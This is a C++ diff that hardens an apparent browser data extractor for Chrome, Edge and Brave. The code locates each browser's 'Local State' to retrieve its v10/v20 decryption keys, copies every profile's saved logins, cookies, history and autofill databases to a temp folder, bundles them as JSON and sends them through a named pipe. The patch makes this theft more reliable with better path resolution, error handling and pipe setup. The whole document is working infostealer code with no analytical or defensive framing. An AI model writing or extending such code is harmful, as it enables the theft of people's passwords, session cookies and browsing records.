@@ -21,16 +21,13 @@ bool copy_file_win32(fs::path src, fs::path dest) {
 }
 
 void log_to_file(const std::string& msg) {
-    char* user_profile = nullptr;
-    size_t len = 0;
-    _dupenv_s(&user_profile, &len, "USERPROFILE");
-    if (user_profile) {
-        fs::path log_path = fs::path(user_profile) / "Desktop" / "extractor_log.txt";
+    wchar_t desktop[MAX_PATH];
+    if (SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, desktop) == S_OK) {
+        fs::path log_path = fs::path(desktop) / "extractor_log.txt";
         std::ofstream log_file(log_path, std::ios::app);
         if (log_file) {
             log_file << "[" << GetTickCount() << "] " << msg << std::endl;
         }
-        free(user_profile);
     }
 }
 
@@ -232,6 +229,14 @@ std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
     return ret;
 }
 
+std::string wstring_to_utf8(const std::wstring& wstr) {
+    if (wstr.empty()) return "";
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    std::string strTo(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+    return strTo;
+}
+
 Browser get_browser() {
     wchar_t path[MAX_PATH];
     GetModuleFileNameW(nullptr, path, MAX_PATH);
@@ -248,37 +253,45 @@ void do_work() {
         Browser browser = get_browser();
         log_to_file("Browser detected: " + std::to_string((int)browser));
 
-        char* user_profile_env = nullptr;
-        size_t len = 0;
-        _dupenv_s(&user_profile_env, &len, "USERPROFILE");
-        if (!user_profile_env) {
-            log_to_file("Error: USERPROFILE env var not found.");
-            return;
+        wchar_t appdata[MAX_PATH];
+        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata) != S_OK) {
+             log_to_file("Error: Failed to get LOCAL_APPDATA.");
+             return;
         }
-        fs::path user_profile(user_profile_env);
-        free(user_profile_env);
+        fs::path local_appdata(appdata);
 
         fs::path data_path;
-        if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
-        else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
-        else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+        if (browser == Browser::Chrome) data_path = local_appdata / "Google/Chrome/User Data";
+        else if (browser == Browser::Edge) data_path = local_appdata / "Microsoft/Edge/User Data";
+        else data_path = local_appdata / "BraveSoftware/Brave-Browser/User Data";
 
         log_to_file("Data path: " + data_path.string());
 
-        fs::path temp_dir = user_profile / "Desktop/chrome_db";
-        fs::create_directories(temp_dir);
+        wchar_t w_temp_path[MAX_PATH];
+        GetTempPathW(MAX_PATH, w_temp_path);
+        fs::path temp_dir = fs::path(w_temp_path) / ("br_tmp_" + std::to_string(GetTickCount()));
+        std::error_code ec;
+        fs::create_directories(temp_dir, ec);
+
+        log_to_file("Temp dir: " + temp_dir.string());
 
         std::string local_state_str;
         fs::path ls_src = data_path / "Local State";
         fs::path ls_tmp = temp_dir / "ls.tmp";
         if (copy_file_win32(ls_src, ls_tmp)) {
+            log_to_file("Local State copied to temp.");
             std::ifstream ls_file(ls_tmp);
             if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
-            fs::remove(ls_tmp);
+            fs::remove(ls_tmp, ec);
         } else {
+            log_to_file("Local State copy failed, trying direct read.");
             std::ifstream ls_file(ls_src);
             if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
         }
+
+    if (local_state_str.empty()) {
+        log_to_file("Error: Local State content is empty.");
+    }
 
     json ls_json = json::parse(local_state_str, nullptr, false);
     std::vector<unsigned char> v10_key, v20_key;
@@ -307,8 +320,11 @@ void do_work() {
     }
 
     std::vector<std::string> profiles = { "Default" };
-    for (const auto& entry : fs::directory_iterator(data_path)) {
-        if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
+    for (const auto& entry : fs::directory_iterator(data_path, ec)) {
+        if (ec) break;
+        if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) {
+            profiles.push_back(entry.path().filename().string());
+        }
     }
 
     json collected = json::array();
@@ -353,7 +369,7 @@ void do_work() {
                 }
                 sqlite3_close(db);
             }
-            fs::remove(tmp_db);
+            fs::remove(tmp_db, ec);
         }
 
         // Cookies
@@ -395,7 +411,7 @@ void do_work() {
                 }
                 sqlite3_close(db);
             }
-            fs::remove(tmp_db);
+            fs::remove(tmp_db, ec);
         }
 
         // History
@@ -416,7 +432,7 @@ void do_work() {
                 }
                 sqlite3_close(db);
             }
-            fs::remove(tmp_db);
+            fs::remove(tmp_db, ec);
         }
 
         // Autofill
@@ -437,7 +453,7 @@ void do_work() {
                 }
                 sqlite3_close(db);
             }
-            fs::remove(tmp_db);
+            fs::remove(tmp_db, ec);
         }
 
         json pj;
@@ -468,7 +484,13 @@ void do_work() {
     }
 
     log_to_file("Attempting JSON dump...");
-    std::string s = collected.dump(-1, ' ', false, nlohmann::json::error_handler_t::replace);
+    std::string s;
+    try {
+        s = collected.dump(-1, ' ', false, nlohmann::json::error_handler_t::replace);
+    } catch (const std::exception& e) {
+        log_to_file("JSON dump exception: " + std::string(e.what()));
+        s = "[]";
+    }
     log_to_file("Generated JSON dump of " + std::to_string(s.size()) + " bytes.");
 
     HANDLE h_pipe = INVALID_HANDLE_VALUE;
@@ -487,6 +509,9 @@ void do_work() {
 
     if (h_pipe != INVALID_HANDLE_VALUE) {
         log_to_file("Connected to named pipe. Attempting to send " + std::to_string(s.size()) + " bytes...");
+        // Ensure pipe is in byte mode
+        DWORD mode = PIPE_READMODE_BYTE;
+        SetNamedPipeHandleState(h_pipe, &mode, NULL, NULL);
         DWORD written;
         if (WriteFile(h_pipe, s.c_str(), (DWORD)s.size(), &written, nullptr)) {
             if (FlushFileBuffers(h_pipe)) {
